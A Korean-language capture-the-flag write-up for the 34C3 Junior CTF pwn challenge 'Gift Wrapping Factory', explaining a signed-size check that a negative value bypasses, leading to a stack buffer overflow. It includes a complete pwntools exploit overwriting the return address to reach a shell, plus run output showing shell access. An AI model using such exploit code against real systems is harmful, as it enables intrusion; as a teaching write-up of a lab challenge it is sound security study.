# [2017_34C3 Junior CTF] \[PWN] Gift Wrapping Factory

## Key words

* stack based buffer overflow
* type confusion

## Description

```
Wrapping gifts is now even more fun! Gift Wrapping Factory 2.0:

nc 35.198.185.193 1341
```

## Solution

```c
int spawn_shell()
{
  return system("/bin/bash");
}
```

`giftwrapper.so` 열어보면 `spawn_shell` 함수가 있습니다. 딱 봐도 쉬운 문제라는 생각이 들죠.

```c
int wrap()
{
  unsigned __int16 v0; // bp
  int v1; // eax
  unsigned int v2; // ebp
  int v3; // ebx
  int v4; // eax
  char v6[96]; // [rsp+0h] [rbp-88h]
  int v7; // [rsp+60h] [rbp-28h]
  __int64 buf; // [rsp+65h] [rbp-23h]
  __int16 v9; // [rsp+6Dh] [rbp-1Bh]
  char v10; // [rsp+6Fh] [rbp-19h]

  printf("What is the size of the gift you want to wrap?\n |> ");
  buf = 0LL;
  v9 = 0;
  v10 = 0;
  if ( read(1, &buf, 0xAuLL) <= 0 )
    exit(1);
  v0 = strtol((const char *)&buf, 0LL, 0);
  if ( (signed __int16)v0 > 0x63 )
    return puts("Sorry! This gift is too large.");
  printf("Please send me your gift.\n |> ", 0LL);
  memset(v6, 0, sizeof(v6));
  v7 = 0;
  v1 = (unsigned __int64)read(1, v6, v0 + 1LL) - 1;
  if ( v6[v1] == 10 )
    v6[v1] = 0;
  puts(
    "         _   _       \n"
    "        ((\\o/))      \n"
    " .-------//^\\\\------.\n"
    " |      /`   `\\     |\n"
    " |                  |");
  if ( (signed __int16)v0 > 0 )
  {
    v2 = (((signed __int16)v0 - 1) & 0xFFFFFFF0) + 16;
    v3 = 0;
    do
    {
      v4 = printf(" | %.16s", &v6[v3]);
      printf("%*c |\n", (unsigned int)(19 - v4), 32LL);
      v3 += 16;
    }
    while ( v3 != v2 );
  }
  puts(" |                  |\n  ------------------ \n");
  return puts("Wow! This looks so beautiful");
}
```

`wrap` 함수 내용을 살펴보면 read 함수를 사용할 때 스택 버퍼오버플로우가 발생할 것 같은 냄새가 납니다. `v1 = (unsigned __int64)read(1, v6, v0 + 1LL) - 1;` 부분에서 `v0` 만큼 버퍼를 읽어오는 것을 확인할 수 있습니다. 그럼 `v0`을 조작하면 되겠습니다.

`v0`의 값은 99 이하의 값을 갖도록 필터링이 걸려있습니다. 하지만  `strtol` 함수 다음 줄의 비교하는 부분에서 타입 컨퓨전 취약점이 발생합니다.  `v0`은 `unsigned int`인데 정작 비교할 때는 `signed int`형으로 캐스팅하여 작업합니다. 간단하게 음수 값을 넣음으로서 필터링을 우회할 수 있습니다.

## Exploit

```python
from pwn import *

r = remote("0", 12345)
raw_input()
print r.recv()
r.sendline("modinfo")
print r.recvuntil("Base address: 0x")
code_base = int(r.recvline()[:-1], 16)
log.info("code base 0x%x" % code_base)

print r.recv()
r.sendline("wrap")
print r.recv()
r.send("-1")
payload = "a" * 136
payload += p64(code_base + 0x9D3)
r.send(payload)
r.interactive()
```

## 실행 결과

```
$ python ex.py 
[+] Opening connection to 0 on port 12345: Done

*
* Gift Wrapping Factory
*
Welcome to the new gift wrapping service!
Type "help" for help :)
> 
************************************
Information about the loaded module:
Name: Gift Wrapping Factory
Base address: 0x
[*] code base 0x7f21b38d8000
************************************
> 
What is the size of the gift you want to wrap?
 |> 
[*] Switching to interactive mode
Please send me your gift.
 |>          _   _       
        ((\o/))      
 .-------//^\\------.
 |      /`   `\     |
 |                  |
 |                  |
  ------------------ 

Wow! This looks so beautiful
$ id
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
```

